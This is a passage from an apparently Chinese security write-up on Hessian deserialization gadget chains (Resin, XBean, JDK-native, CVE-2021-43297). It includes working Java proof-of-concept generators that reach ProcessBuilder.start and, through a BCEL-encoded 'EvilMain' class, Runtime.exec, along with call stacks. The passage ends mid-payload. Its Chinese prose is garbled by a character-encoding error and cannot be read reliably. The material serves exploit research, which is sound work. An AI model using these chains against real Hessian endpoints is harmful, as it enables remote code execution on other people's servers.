<h3 id="3-3-æ¼æ´åŠåˆ©ç”¨"><a href="#3-3-æ¼æ´åŠåˆ©ç”¨" class="headerlink" title="3.3 æ¼æ´åŠåˆ©ç”¨"></a>3.3 æ¼æ´åŠåˆ©ç”¨</h3><p>ä»ä¸Šé¢çš„åˆ†æèƒ½çœ‹å‡ºæ¥ï¼Œæ— è®ºHessian1è¿˜æ˜¯2ï¼Œåœ¨å¤„ç†è‡ªå®šä¹‰ç±»å‹ï¼ˆObjectï¼‰å¯¹è±¡éƒ½æ˜¯é€šè¿‡<code>_unsafe.allocateInstance</code>åˆ›å»ºå®ä¾‹ã€readObjectè·å–å€¼ã€<code>Unsafe#putObject</code>å†™å…¥å±æ€§å€¼ã€‚å…¶ä¸­readObjectæ–¹æ³•ä¸javaåŸç”Ÿååºåˆ—åŒ–æµç¨‹ä¹Ÿä¸åŒï¼Œä¸ä¼šåœ¨è¿‡ç¨‹ä¸­è°ƒç”¨ç›®æ ‡ç±»çš„readObjectæ–¹æ³•ã€‚ä¸fastjsonååºåˆ—åŒ–ä¹Ÿä¸åŒï¼Œä¸ä¼šè°ƒç”¨ç›®æ ‡å±æ€§çš„getter&#x2F;setteræ–¹æ³•è¿›è¡Œèµ‹å€¼ã€‚é‚£ä¹ˆæœ‰å“ªäº›è§¦å‘ç‚¹å¯ä»¥ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Ÿç­”æ¡ˆå°±æ˜¯Mapï¼Mapåœ¨Hessianååºåˆ—åŒ–ä¸­å æœ‰é‡è¦åœ°ä½</p>
<p>Hessianå¯¹äºMapç±»å‹çš„ååºåˆ—åŒ–å¤„ç†åœ¨com.caucho.hessian.io.MapDeserializer#readMapä¸­ï¼Œåˆå§‹åŒ–HashMapã€TreeMapï¼Œæ¥ç€è°ƒç”¨å„è‡ªçš„putæ–¹æ³•ï¼Œè€Œmapçš„putæ–¹æ³•ä¸€ç›´æ˜¯ååºåˆ—åŒ–é“¾çš„â€æ˜æ˜Ÿâ€æ–¹æ³•ï¼Œå‡ºåœºç‡æé«˜ã€‚</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/29.png" srcset="/img/loading.gif" lazyload></p>
<p>java.util.HashMap#putä¼šè°ƒç”¨åˆ°keyçš„hashCodeã€equalsæ–¹æ³•æ£€æŸ¥keyæ˜¯å¦é‡å¤</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/30.png" srcset="/img/loading.gif" lazyload></p>
<p>java.util.TreeMap#putä¼šè°ƒç”¨keyçš„compareToã€comparatorå±æ€§çš„compareæ–¹æ³•è¿›è¡Œæ’åº</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/31.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰€ä»¥å¯»æ‰¾hessianååºåˆ—åŒ–é“¾çš„è¦ç‚¹ï¼š</p>
<p>1ã€èµ·ç‚¹æ˜¯hashCode&#x2F;equals&#x2F;compareToç­‰æ–¹æ³•</p>
<p>2ã€æ‰§è¡Œæ–¹æ³•ä¸ä¾èµ–ç±»æœ¬èº«readObject&#x2F;getter&#x2F;setterç­‰æ–¹æ³•çš„é€»è¾‘</p>
<p>3ã€æ— è®ºç›®æ ‡ç±»æ˜¯å¦å®ç°Serializableæ¥å£ï¼Œéƒ½ä¸å½±å“ååºåˆ—åŒ–æ“ä½œ</p>
<p>4ã€ç›®æ ‡ç±»çš„æ„é€ æ–¹æ³•å¿…é¡»æ˜¯publicçŠ¶æ€ï¼ˆ_unsafe.allocateInstanceåˆ›å»ºå®ä¾‹æ—¶å¹¶æœªè°ƒç”¨setAccessableè®¾ç½®ï¼‰</p>
<p>hessianç›®å‰åœ¨ <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> ä¸­çš„é“¾ï¼šRomeã€XBeanã€Resinã€SpringPartiallyComparableAdvisorHolderã€SpringAbstractBeanFactoryPointcutAdvisorï¼ŒæŒ‘XBeanä¸Resinåˆ†æä¸‹ï¼Œå†çœ‹çœ‹JDKåŸç”Ÿçš„ä¸¤æ¡é“¾</p>
<h4 id="3-3-1-Resinåˆ©ç”¨é“¾"><a href="#3-3-1-Resinåˆ©ç”¨é“¾" class="headerlink" title="3.3.1 Resinåˆ©ç”¨é“¾"></a>3.3.1 Resinåˆ©ç”¨é“¾</h4><p>Resinåˆ©ç”¨é“¾å…¥å£æ˜¯com.sun.org.apache.xpath.internal.objects.XString#equalsæ–¹æ³•ï¼Œæœ€ç»ˆè§¦å‘ç‚¹æ˜¯ javax.naming.spi.NamingManager#getObjectFactoryFromReferenceè¿œç¨‹åŠ è½½ç±»ï¼Œé«˜ç‰ˆæœ¬çš„JDKå…³é—­äº†åŠ è½½ï¼Œä½†æ˜¯å­˜åœ¨ä¸€äº›factoryçš„ç»•è¿‡ï¼Œä¸è¿‡å¤šé˜è¿°ã€‚åœ¨ç¬”è€…ä¹‹å‰çš„JNDIæ³¨å…¥æ–‡ç« è¯´æ˜è¿‡ï¼š<a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getObjectFactoryFromReference:</span><span class="hljs-number">156</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getObjectInstance:</span><span class="hljs-number">319</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getContext:</span><span class="hljs-number">439</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getTargetContext:</span><span class="hljs-number">55</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">composeName:</span><span class="hljs-number">180</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">353</span>, QName (<span class="hljs-keyword">com</span>.caucho.naming)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">392</span>, XString (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xpath.internal.objects)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/32.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-3-2-XBeanåˆ©ç”¨é“¾"><a href="#3-3-2-XBeanåˆ©ç”¨é“¾" class="headerlink" title="3.3.2 XBeanåˆ©ç”¨é“¾"></a>3.3.2 XBeanåˆ©ç”¨é“¾</h4><p>XBeanåˆ©ç”¨é“¾ä¸resinçš„å¾ˆç±»ä¼¼ï¼Œå‡åˆ©ç”¨äº†XString#equalsã€è§¦å‘ç‚¹NamingManager#getObjectFactoryFromReferenceï¼Œåªä¸è¿‡ç”±QNameæ¢æˆäº†Bindingã€‚ç•™ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸ä½¿ç”¨XStringç›´æ¥å»è§¦å‘ï¼Œè€Œæ˜¯è¦ä½¿ç”¨springä¸­çš„HotSwappableTargetSource</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getObjectFactoryFromReference:<span class="hljs-number">156</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>getObjectInstance:<span class="hljs-number">319</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>resolve:<span class="hljs-number">73</span>, ContextUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>getObject:<span class="hljs-number">204</span>, ContextUtil<span class="hljs-variable">$ReadOnlyBinding</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>toString:<span class="hljs-number">192</span>, Binding (javax.naming)<br>equals:<span class="hljs-number">392</span>, XString (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects)<br>equals:<span class="hljs-number">104</span>, HotSwappableTargetSource (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.target)<br>putVal:<span class="hljs-number">634</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readObject:<span class="hljs-number">1160</span>, HessianInput (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/33.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-3-3-JDKåŸç”Ÿé“¾"><a href="#3-3-3-JDKåŸç”Ÿé“¾" class="headerlink" title="3.3.3 JDKåŸç”Ÿé“¾"></a>3.3.3 JDKåŸç”Ÿé“¾</h4><p>0ctf2022çš„é¢˜ç›® hessian only jdkï¼Œé¢˜ç›®é¢„æœŸè§£æ˜¯å¯»æ‰¾åªä¾èµ–äºjdkçš„Hessianååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚é¢˜ç›®ä¿¡æ¯åœ¨è¿™é‡Œï¼š<a target="_blank" rel="noopener" href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk</a>  </p>
<p>HessianæœåŠ¡ç«¯åœ¨è¿˜åŸMapç±»å‹æ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨putæ–¹æ³•ï¼Œåœ¨putæ–¹æ³•ä¸­ä¼šè§¦å‘keyã€valueçš„equals&#x2F;hashCodeç­‰æ“ä½œï¼Œè¿™æ˜¯ååºåˆ—åŒ–é“¾çš„å¼€å§‹ã€‚å¦å¤–åœ¨Hessianååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå®¢æˆ·ç«¯æŒ‡å®šçš„ç±»å‹typeä¸å®é™…å¯¹è±¡ç±»å‹ä¸ä¸€è‡´æ—¶ä¼šè°ƒç”¨å¼‚å¸¸å¤„ç†å‡½æ•°exceptï¼Œè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨obj#toStringæ–¹æ³•æ‰“å°objã€‚è¿™ä¸ªæ´è¢«åˆ†é…äº†ç¼–å·CVE-2021-43297ã€‚æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸ºHessianååºåˆ—åŒ–é“¾å¢åŠ äº†ä¸€ä¸ªå…¥å£ï¼štoStringæ–¹æ³•ã€‚ç°åœ¨å¯ç”¨çš„å…¥å£æ–¹æ³•ï¼šequals&#x2F;hashCode&#x2F;toString&#x2F;compareTo</p>
<p>å¦å¤–Hashtable#equalsæ–¹æ³•ä¼šè§¦å‘å…¶valueå€¼çš„getæ–¹æ³•ï¼Œåœ¨JDKä¸­å­˜åœ¨<code>javax.swing.UIDefaults#get(Object)-&gt;sun.swing.SwingLazyValue#createValue-&gt;sun.reflect.misc.MethodUtil#invoke(static)</code>è¿™æ¡é“¾è·¯ï¼Œ<strong>æ–¹æ³•sun.swing.SwingLazyValue#createValueå¯ä»¥è°ƒç”¨ä»»æ„é™æ€æ–¹æ³•æˆ–è€…æ˜¯ä»»æ„ç±»çš„æ„é€ æ–¹æ³•ï¼ˆva2ï¼‰</strong>ï¼Œæ‰€ä»¥Hessian JDKåŸç”Ÿé“¾åŸºæœ¬éƒ½æ˜¯å¯»æ‰¾<code>é™æ€å‡½æ•°---&gt;RCE</code>çš„é“¾è·¯ï¼Œä¸»è¦æœ‰ä¸¤ç§æ€è·¯ï¼š1ã€ä¿®æ”¹ç¯å¢ƒé…ç½®ï¼Œç»•è¿‡JDKå®‰å…¨é™åˆ¶ï¼›2ã€é™æ€æ–¹æ³•ç›´æ¥è§¦å‘RCEã€‚å½“ç„¶è¿˜æœ‰ä»xxx.toString-&gt;invoke()-&gt;static function-&gt;rceçš„é“¾è·¯</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/34.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-3-3-1-MethodUtils-invoke"><a href="#3-3-3-1-MethodUtils-invoke" class="headerlink" title="3.3.3.1  MethodUtils.invoke"></a>3.3.3.1  MethodUtils.invoke</h5><p>æœ‰å¸ˆå‚…æ‰¾åˆ°äº†sun.reflect.misc.MethodUtil#invokeè¿™ä¸ªé™æ€æ–¹æ³•ï¼Œå°†è°ƒç”¨ä»»æ„é™æ€æ–¹æ³•è½¬åŒ–ä¸ºäº†è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œç»“åˆProcessBuilder.startå®ŒæˆRCE</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/35.png" srcset="/img/loading.gif" lazyload></p>
<p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„pocä»£ç </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static HashMap&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; getObject2() throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-keyword">Object</span> target = <span class="hljs-built_in">new</span> ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;);<br>        <span class="hljs-keyword">Method</span> invoke = sun.reflect.misc.MethodUtil.<span class="hljs-keyword">class</span>.getMethod(&quot;invoke&quot;, <span class="hljs-keyword">Method</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>[].<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">Method</span> start = ProcessBuilder.<span class="hljs-keyword">class</span>.getMethod(&quot;start&quot;);<br>        SwingLazyValue swingLazyValue = <span class="hljs-built_in">new</span> SwingLazyValue(<br>                &quot;sun.reflect.misc.MethodUtil&quot;,<br>                &quot;invoke&quot;,<br>                <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;invoke, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>(), <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-keyword">start</span>, target, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;&#125;&#125;);<br>        <span class="hljs-keyword">Object</span>[] keyValueList = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;abc&quot;,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br>        UIDefaults uiDefaults2 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br><br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable1 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable2 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        hashtable1.put(&quot;a&quot;,uiDefaults1);<br>        hashtable2.put(&quot;a&quot;,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ•´ä½“çš„è°ƒç”¨æ ˆï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">start:</span><span class="hljs-number">1007</span>, ProcessBuilder (java.lang)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/36.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main"><a href="#3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main" class="headerlink" title="3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main"></a>3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main</h5><p>è¿™æ¡é“¾çš„å‰åŠéƒ¨åˆ†åˆ©ç”¨äº†<code>PKCS9Attributes#toString-&gt;UIDefaults#get </code>ï¼ŒååŠéƒ¨åˆ†é™æ€æ–¹æ³•ä½¿ç”¨çš„æ˜¯<code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_main</code>ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­classloaderï¼ˆcom.sun.org.apache.bcel.internal.util.ClassLoaderï¼‰åŠ è½½bcelä¸²å¾—åˆ°classï¼Œæ¥ç€å†è°ƒç”¨è‡ªå®šä¹‰ç±»çš„ <code>_main</code> æ–¹æ³•ã€‚å¦å¤–bcelclassloader com.sun.org.apache.bcel.internal.util.ClassLoader#loadClassåŠ è½½classæ—¶ä½¿ç”¨çš„æ˜¯defineClassè€Œä¸æ˜¯Class.forNameï¼Œä¸ä¼šç›´æ¥åŠ è½½é™æ€ä»£ç å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥éœ€è¦å°†æ‰§è¡Œçš„ä»£ç å†™å…¥åˆ° <code>_main</code>æ–¹æ³•ä¸­å®Œæˆåˆ©ç”¨</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/37.png" srcset="/img/loading.gif" lazyload></p>
<p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„pocä»£ç ï¼Œè¿™ä¸ªéœ€è¦æ³¨æ„åœ¨åºåˆ—åŒ–æ•°æ®æ—¶æå‰å†™å…¥ä¸€ä¸ªå­—ç¬¦å¯¼è‡´è§¦å‘expectè¿›è€Œå®Œæˆ<code>Hessian2Input#readObject---&gt;XXX.toString</code>å¾—é“¾è·¯è¿æ¥ã€‚ç»ç ”ç©¶ï¼Œé™¤äº†67ï¼Œå¦å¤–79ã€81ã€86ã€88éƒ½æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºéƒ½è°ƒç”¨äº†readIntï¼Œæœ€ç»ˆéƒ½å¯ä»¥è§¦å‘expectæ–¹æ³•</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.sun.org.apache.bcel.internal.Repository;<br>import com.sun.org.apache.bcel.internal.classfile.Utility;<br>import org.utils.Payload;<br>import org.utils.Reflections;<br>import sun.reflect.ReflectionFactory;<br>import sun.security.pkcs.PKCS9Attribute;<br>import sun.security.pkcs.PKCS9Attributes;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;<br><br>public <span class="hljs-keyword">class</span> JavaWrapperBcel &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run267(get<span class="hljs-constructor">JavaWrapperBcelObject()</span>);<br>    &#125;<br>    public static Object get<span class="hljs-constructor">JavaWrapperBcelObject()</span> throws Exception &#123;<br>        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;<br>        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;<br>        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(EvilMain.<span class="hljs-params">class</span>)</span>.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(payload);<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;<br>        return s;<br>    &#125;<br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;<br>    &#125;<br><br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;<br>        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;<br>        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/38.png" srcset="/img/loading.gif" lazyload></p>
<p>è°ƒç”¨æ ˆï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">exec:</span><span class="hljs-number">347</span>, Runtime (java.lang)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">5</span>, $$BCEL$$$l<span class="hljs-number">$8b</span><span class="hljs-number">$I</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$AmQMO</span><span class="hljs-number">$c2</span><span class="hljs-number">$40</span><span class="hljs-number">$Q</span><span class="hljs-number">$7d</span><span class="hljs-number">$L</span><span class="hljs-number">$85</span><span class="hljs-number">$d2</span><span class="hljs-number">$8a</span><span class="hljs-number">$f2</span><span class="hljs-number">$r</span><span class="hljs-number">$f8</span><span class="hljs-number">$fd</span><span class="hljs-number">$7d</span><span class="hljs-number">$Q</span><span class="hljs-number">$3c</span><span class="hljs-number">$d8</span><span class="hljs-number">$8b</span><span class="hljs-number">$H</span><span class="hljs-number">$T</span><span class="hljs-number">$8c</span><span class="hljs-number">$X</span><span class="hljs-number">$a3</span><span class="hljs-number">$a7F</span><span class="hljs-number">$8d</span><span class="hljs-number">$Y</span><span class="hljs-number">$3cx0K</span><span class="hljs-number">$dd</span><span class="hljs-number">$d4</span><span class="hljs-number">$r</span><span class="hljs-number">$a5</span><span class="hljs-number">$rm</span><span class="hljs-number">$n</span><span class="hljs-number">$fc</span><span class="hljs-number">$z</span>$_j<span class="hljs-number">$3c</span><span class="hljs-number">$f8</span><span class="hljs-number">$D</span><span class="hljs-number">$fcQ</span><span class="hljs-number">$c6</span><span class="hljs-number">$d9j</span><span class="hljs-number">$acQ6</span><span class="hljs-number">$d9y</span><span class="hljs-number">$9973</span><span class="hljs-number">$ef</span><span class="hljs-number">$cdf</span><span class="hljs-number">$df</span><span class="hljs-number">$3f</span><span class="hljs-number">$5e</span><span class="hljs-number">$df</span><span class="hljs-number">$A</span><span class="hljs-number">$i</span><span class="hljs-number">$60</span><span class="hljs-number">$c7D</span><span class="hljs-number">$k</span><span class="hljs-number">$N</span><span class="hljs-number">$T</span><span class="hljs-number">$LX</span><span class="hljs-number">$y</span><span class="hljs-number">$60I</span><span class="hljs-number">$e1</span><span class="hljs-number">$b2</span><span class="hljs-number">$8e</span><span class="hljs-number">$V</span><span 